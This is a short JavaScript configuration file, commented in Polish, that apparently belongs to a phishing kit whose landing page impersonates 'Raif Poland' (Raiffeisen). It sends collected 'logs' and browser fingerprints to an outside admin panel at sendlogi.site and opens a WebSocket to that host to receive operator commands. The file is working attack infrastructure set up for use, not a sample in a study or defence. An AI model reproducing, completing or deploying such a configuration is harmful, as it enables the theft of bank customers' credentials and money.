/**
 * Konfiguracja lądowania Raif Poland
 * Logi trafiają do: https://sendlogi.site/admin/gate
 */

const CURRENT_ORIGIN = typeof window !== 'undefined'
    ? window.location.origin.replace(/\/$/, '')
    : 'Raif Poland - Test';

const CONFIG = {
    // URL panelu admina (gdzie wysyłać dane)
    ADMIN_API_URL: 'https://sendlogi.site',
    
    // WebSocket URL panelu admina (do otrzymywania poleceń)
    ADMIN_WS_URL: 'wss://sendlogi.site/ws',
    
    // ID tego lądowania (unikalne dla każdej strony)
    LANDING_ID: 'raif_poland',
    
    // Nazwa lądowania (wyświetlana w panelu admina)
    LANDING_NAME: 'Raif Poland',
    
    SETTINGS: {
        sendFingerprint: true,
        sendGeolocation: false,
        wsReconnectTimeout: 3000,
        debug: true
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = CONFIG;
}
